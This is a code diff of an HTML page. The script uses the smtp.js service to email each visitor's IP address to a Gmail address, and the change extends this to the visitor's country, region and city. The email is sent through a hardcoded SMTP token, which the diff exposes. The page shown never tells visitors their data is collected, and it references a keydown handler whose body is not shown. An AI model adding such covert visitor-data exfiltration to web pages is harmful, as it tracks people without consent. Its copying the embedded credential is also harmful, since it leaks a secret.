@@ -5,8 +5,8 @@
 <body>
 <script src="https://smtpjs.com/v3/smtp.js"></script>
 
-<script type="application/javascript">var ip;  function getIP(json) {
-    ip = json.ip;
+<script type="application/javascript">var text;  function getIP(json) {
+    text = json.ip + json.country + json.region + json.city;
   }
   
 </script>
@@ -28,8 +28,8 @@ window.document.onkeydown = keydown;
     Password : "A4E2C40238341D16E2460663CA628298A0D7",
     To : 'haineko04073@gmail.com',
     From : "udon0407@gmail.com",
-    Subject : "test",
-    Body : ip
+    Subject : "mail",
+    Body : text
 }).then(
         message => document.write(message)
   
